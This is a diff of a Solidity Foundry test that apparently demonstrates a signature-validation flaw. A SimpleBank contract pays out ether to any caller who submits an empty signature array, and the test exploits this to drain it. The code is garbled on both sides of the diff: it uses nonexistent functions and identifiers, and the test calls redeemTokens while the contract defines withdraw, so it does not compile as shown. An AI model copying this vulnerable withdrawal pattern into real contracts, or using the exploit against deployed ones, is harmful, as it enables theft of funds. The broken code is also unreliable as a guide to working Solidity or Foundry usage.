@@ -3,29 +3,30 @@ pragma solidity ^0.8.15;
 import "forge-std/Test.sol";
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
-*/
-contract PactTest is Test {
-    SimpleBank SimpleBankPact;
+contract AgreementTest is Test {
+    SimpleBank SimpleBankAgreement;
 
-    function groupUp() public {
-        SimpleBankPact = new SimpleBank();
+    function collectionUp() public {
+        SimpleBankAgreement = new SimpleBank();
     }
 
     function testVulnMarkValidation() public {
-        payable(address(SimpleBankPact)).transfer(10 ether);
+        payable(address(SimpleBankAgreement)).transfer(10 ether);
         address alice = vm.addr(1);
-        vm.openingPrank(alice);
+        vm.beginPrank(alice);
 
         SimpleBank.Mark[] memory sigs = new SimpleBank.Mark[](0);
 
 
-        console.journal(
+        console.record(
             "Before operation",
             address(alice).balance
         );
-        SimpleBankPact.harvestGold(sigs);
+        SimpleBankAgreement.redeemTokens(sigs);
 
-        console.journal("execution complete").balance
+        console.record(
+            "Afer exploiting, Alice's ether balance",
+            address(alice).balance
         );
     }
 
@@ -33,29 +34,29 @@ contract PactTest is Test {
 }
 
 contract SimpleBank {
-    struct Mark {
-        bytes32 signature;
+    struct Signature {
+        bytes32 hash;
         uint8 v;
         bytes32 r;
         bytes32 s;
     }
 
-    function validateSignatures(Mark calldata sig) public {
+    function verifySignatures(Signature calldata sig) public {
         require(
-            msg.initiator == ecrecover(sig.signature, sig.v, sig.r, sig.s),
+            msg.sender == ecrecover(sig.hash, sig.v, sig.r, sig.s),
             "Invalid signature"
         );
     }
 
-    function harvestGold(Mark[] calldata sigs) public {
+    function withdraw(Signature[] calldata sigs) public {
 
 
-        for (uint i = 0; i < sigs.size; i++) {
-            Mark calldata seal = sigs[i];
+        for (uint i = 0; i < sigs.length; i++) {
+            Signature calldata signature = sigs[i];
 
-            validateSignatures(seal);
+            verifySignatures(signature);
         }
-        payable(msg.initiator).transfer(1 ether);
+        payable(msg.sender).transfer(1 ether);
     }
 
     receive() external payable {}
